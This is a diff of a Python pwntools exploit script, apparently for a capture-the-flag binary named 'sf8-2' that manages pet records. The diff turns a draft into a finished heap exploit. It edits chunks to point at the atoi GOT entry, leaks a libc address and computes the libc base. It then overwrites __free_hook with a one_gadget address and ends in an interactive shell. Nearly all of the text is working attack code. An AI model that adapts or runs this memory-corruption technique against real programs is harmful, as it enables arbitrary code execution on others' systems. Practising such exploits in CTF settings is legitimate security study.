@@ -5,7 +5,6 @@ e = ELF("./sf8-2")
 
 # context.log_level = 'debug'
 
-
 def create(name, kind, age):
     p.recvuntil("> ")
     p.sendline("1")
@@ -36,44 +35,32 @@ def delete(index):
     p.sendline("5")
     p.sendafter("> ", str(index))
     
-    
-create("AAAA", "BBBB", "10")
-edit(0, "CCCC", "DDDD", "10", "n")
-create("EEEE", p64(0x602068), "11")
-# p64(0x602068)
-# input()
-# edit(0, p64(0x400730 + 6), "FFFF", "12", "y")
+atoi_got = 0x602068
+atoi_plt = 0x400730
+bss = 0x6020a0 + 0x200
+pet_chunk = 0x00000000006020A0
 
-print_one(1)
+create("AAAA", "BBBB", "16")
+edit(0, "CCCC", "DDDD", "16", "n")
+create("EEEE", p64(0x6020B0)+p64(bss), "16")
 
-p.recvuntil("kind: ")
+edit("0", p64(bss), p64(atoi_got), "16", "y")
+
+
+print_one(2)
+
+p.recvuntil("name: ")
 leak = u64(p.recv(6).ljust(8, b'\x00'))
 
-print(hex(leak))
+libc_base = leak - 0x36e90
+free_hook = libc_base + 0x3c67a8
+one_gadget = libc_base + 0xf1247
 
+create("FFFF", "GGGG", "16")
 
-input()
-
-# # input()
-
-# print_one(0)
-# p.recvuntil("name: ")
-# leak = p.recvline()[:-1] + b'\x00\x00'
-# leak = u64(leak)
-
-# libc_base = leak - 0x35a960
-# one = libc_base + 0x45226
-# free_hook = libc_base + 0x3c67a8
-
-# print(hex(leak))
-
-# edit(0, "GGGG", "HHHH", "13", "n")
-# create("IIII", p64(free_hook + 6), "14")
-
-# input()
-# edit(0, p64(one), "JJJJ", "15", "y")
-
-# input()
-# # input()
+create("HHHH", "IIII", "16") # new chunk -> hook overwite
+edit(4, "JJJJ", "KKKK", "16", "n")
+create("LLLL", p64(free_hook), "16")
+edit(4, p64(one_gadget), "MMMM", "16", "y")
 
 p.interactive()
